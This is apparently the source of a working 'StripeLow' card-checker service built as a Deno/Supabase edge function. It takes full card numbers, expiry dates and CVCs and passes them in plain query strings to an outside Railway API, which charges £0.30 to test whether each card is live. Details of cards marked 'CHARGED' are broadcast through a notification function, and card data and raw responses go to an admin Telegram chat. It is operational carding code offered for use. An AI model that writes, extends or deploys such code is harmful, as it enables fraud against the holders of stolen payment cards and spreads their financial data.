import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";

const API_BASE_URL = "https://3-production-c130.up.railway.app/api";

// Send debug to admin Telegram
const sendAdminDebug = async (
  cc: string,
  status: string,
  message: string,
  rawResponse: string,
  username?: string
) => {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log("[STRIPELOW] No Telegram bot token configured");
    return;
  }

  try {
    const maskedCard = cc.replace(/^(\d{6})(\d+)(\d{4})/, '$1******$3');
    const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    
    // Truncate raw response if too long
    const truncatedRaw = rawResponse.length > 1500 
      ? rawResponse.substring(0, 1500) + '... [truncated]' 
      : rawResponse;
    
    const debugMessage = `🔧 <b>STRIPELOW DEBUG</b>

📇 <b>Card:</b> <code>${maskedCard}</code>
👤 <b>User:</b> ${username || 'Unknown'}
📊 <b>Status:</b> ${status.toUpperCase()}
💬 <b>Message:</b> ${message}

━━━━ RAW API RESPONSE ━━━━
<pre>${truncatedRaw}</pre>

🕐 ${timestamp}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: debugMessage,
        parse_mode: "HTML",
      }),
    });
    
    console.log("[STRIPELOW] Admin debug sent successfully");
  } catch (error) {
    console.error("[STRIPELOW] Failed to send admin debug:", error);
  }
};

// Notify charged card (fire-and-forget)
const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      userId,
      cardDetails,
      status,
      responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[STRIPELOW] notify-charged-card error:", err));
};

// Call the API
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}`;
  
  console.log(`[STRIPELOW] Calling: ${apiUrl}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[STRIPELOW] Raw response: ${rawText}`);
    
    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response from gateway', rawResponse: '' };
    }
    
    let apiStatus = 'charged'; // Default to charged
    let apiMessage = 'Transaction processed';
    
    try {
      const json = JSON.parse(rawText);
      
      // Extract status from result.status (nested structure)
      const statusField = String(json.result?.status || json.status || '').toLowerCase();
      
      // Determine status based on API response
      if (statusField === 'declined') {
        apiStatus = 'dead';
        // Extract message from nested result.error.message
        if (json.result?.error?.message) {
          apiMessage = json.result.error.message;
        } else if (json.result?.message) {
          apiMessage = json.result.message;
        } else if (json.message && typeof json.message === 'string') {
          apiMessage = json.message;
        } else {
          apiMessage = 'Card declined';
        }
      } else if (statusField === '3ds_complete' || statusField === 'requires_action') {
        apiStatus = 'dead';
        apiMessage = '3DS Authentication Required';
      } else {
        // Any other status = charged
        apiStatus = 'charged';
        // Extract message for charged cards
        if (json.result?.error?.message) {
          apiMessage = json.result.error.message;
        } else if (json.result?.message) {
          apiMessage = json.result.message;
        } else if (json.message && typeof json.message === 'string') {
          apiMessage = json.message;
        } else {
          apiMessage = 'Transaction processed';
        }
      }
      
    } catch {
      // Non-JSON response - default to charged, use raw text as message
      apiMessage = rawText.substring(0, 200);
    }
    
    return { status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Unknown error';
    console.error(`[STRIPELOW] Error: ${errMsg}`);
    return { status: 'unknown', message: 'Request timeout or connection error', rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Validate card format: CardNumber|MM|YY|CVC
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call while auth happens in parallel
    const apiPromise = callApi(cc);

    // Verify auth
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Check if banned and get username
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned, username")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Check if user is admin (for raw response access)
    const { data: roleData } = await supabase
      .from("user_roles")
      .select("role")
      .eq("user_id", user.id)
      .eq("role", "admin")
      .single();
    
    const isAdmin = !!roleData;

    // Wait for API result
    const result = await apiPromise;
    
    // Send debug to admin Telegram only for CHARGED and UNKNOWN (not DEAD)
    if (result.status === 'charged' || result.status === 'unknown') {
      sendAdminDebug(
        cc,
        result.status,
        result.message,
        result.rawResponse,
        profile?.username || user.email
      );
    }
    
    // Broadcast CHARGED cards to channel (fire-and-forget)
    if (result.status === 'charged') {
      notifyChargedCard(
        user.id,
        cc,
        'CHARGED',
        result.message,
        '£0.30',
        'StripeLow'
      );
    }
    
    // Map status to API response format
    const statusMap: Record<string, string> = {
      'charged': 'CHARGED',
      'dead': 'DEAD'
    };
    
    // Build response - only include rawResponse for admins
    const responseData: Record<string, unknown> = {
      computedStatus: result.status,
      apiStatus: statusMap[result.status] || 'UNKNOWN',
      apiMessage: result.message,
      apiTotal: '£0.30',
      chargeAmount: '£0.30',
      status: result.status,
      message: result.message,
    };
    
    // Only include raw response for admins
    if (isAdmin) {
      responseData.rawResponse = result.rawResponse;
    }
    
    return new Response(
      JSON.stringify(responseData),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
